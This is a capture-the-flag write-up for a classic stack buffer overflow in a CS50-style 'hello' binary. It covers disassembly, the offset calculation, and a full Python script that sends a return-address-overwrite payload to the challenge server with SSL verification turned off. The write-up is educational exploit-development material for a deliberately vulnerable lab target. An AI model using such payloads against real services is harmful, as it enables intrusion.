# pset1 - Solution Writeup

## The Challenge
**Description:**
> I just started the CS50 course, and I'm having so much fun! I even completed my first C exercise: https://cs50.harvard.edu/x/psets/1/me/
> 
> I gave myself plenty of room for my name, or at least, I think I did. C is hard, you know?

**Flag:** `NNS{bUfF3R_4nD_Mem0rY_i5_Hard_wHeN_oV3Rfl0ws_eXist}`

## Analysis

The challenge description hints at the CS50 "me" exercise, which simply asks the user for their name and prints "hello, name". The mention of "plenty of room for my name" suggests a classic **Buffer Overflow** vulnerability, likely due to the use of an unsafe function like `gets()` to read user input.

We are provided with a compiled binary (`hello`). Since we don't have the source code, we can analyze the binary using standard reverse engineering tools. Running `objdump -d` or examining the symbols reveals the presence of a function named `win` at address `0x401b00`.

This `win` function opens `flag.txt` using `_IO_new_fopen`, reads the contents, and prints them to `stdout` using `_IO_fputs`.

The `main` function starts by allocating space on the stack:
```assembly
0000000000401b71 <main>:
...
  401b79:	48 83 ec 40          	sub    $0x40,%rsp
```
This tells us the buffer is exactly 64 bytes (`0x40`). The stack frame also contains the saved Base Pointer (`rbp`, 8 bytes) followed by the saved Return Instruction Pointer (`rip`, 8 bytes). 

Therefore, to overwrite the return address and redirect execution to the `win` function, we need a padding of `64 + 8 = 72` bytes. 

## Exploitation Strategy

Our payload needs to accomplish the following:
1. Fill the 64-byte buffer.
2. Overwrite the saved `rbp` (we can just use 8 bytes of padding, or a dummy value).
3. Overwrite the saved `rip` with the address of the `win` function (`0x401b00`).

The total offset to the return address is 72 bytes. The payload will be:
`"A" * 72 + \x00\x1b\x40\x00\x00\x00\x00\x00`

## The Solve Script

Here is a Python script that connects to the instance over SSL, waits for the prompt, and sends the exploit payload.

```python
import socket
import ssl
import time

def solve():
    host = 'pset1-1eac04583216.chall.nnsc.tf'
    port = 1337

    # Bypass SSL verification since it's a CTF challenge
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE

    win_addr = b"\x00\x1b\x40\x00\x00\x00\x00\x00"
    
    # 72 bytes to reach RIP (64 bytes for buffer + 8 for RBP)
    payload = b"A" * 72 + win_addr + b"\n"

    try:
        with socket.create_connection((host, port)) as sock:
            with context.wrap_socket(sock, server_hostname=host) as ssock:
                print("Connected!")
                
                # Receive the "What is your name?\n\n> " prompt
                ssock.recv(1024)
                
                print("Sending payload...")
                ssock.sendall(payload)
                
                # Small delay to ensure everything executes
                time.sleep(1)
                
                # Read the remaining output, which includes the flag
                resp = ssock.recv(4096).decode(errors='replace')
                print(resp)
                
    except Exception as e:
        print("Error:", e)

if __name__ == "__main__":
    solve()
```
